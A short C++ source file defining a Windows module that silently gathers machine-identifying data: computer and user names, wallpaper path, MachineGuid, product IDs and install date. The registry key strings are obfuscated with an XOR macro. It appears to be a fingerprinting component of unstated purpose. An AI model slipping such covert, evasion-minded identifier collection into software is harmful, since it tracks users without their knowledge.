
#include "module.h"

DEFINE_MODULE(Windows,
	{
		TCHAR wallpaper[MAX_PATH];

		SystemParametersInfo(SPI_GETDESKWALLPAPER, MAX_PATH, &wallpaper, NULL);

		data["wallpaper_path"] = wallpaper;

		TCHAR  infoBuf[MAX_COMPUTERNAME_LENGTH + 1];
		DWORD  bufCharCount = MAX_COMPUTERNAME_LENGTH + 1;

		GetComputerName(infoBuf, &bufCharCount);

		data["computer"] = infoBuf;

		GetUserName(infoBuf, &bufCharCount);

		data["user"] = infoBuf;

		GetRegString(HKEY_LOCAL_MACHINE, XOR("SOFTWARE\\Microsoft\\Cryptography"), XOR("MachineGuid"), {
			data["machine_guid"] = value;
		});

		GetRegString(HKEY_LOCAL_MACHINE, XOR("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion"), XOR("ProductId"), {
			data["product_id"] = value;
		});

		GetRegBinary(HKEY_LOCAL_MACHINE, XOR("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion"), XOR("DigitalProductId"), {
			data["digital_product_id"] = simple_hash((char*)value, length);
		});

		GetRegQWORD(HKEY_LOCAL_MACHINE, XOR("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion"), XOR("InstallDate"), {
			data["install_date"] = value;
		});
	}
)
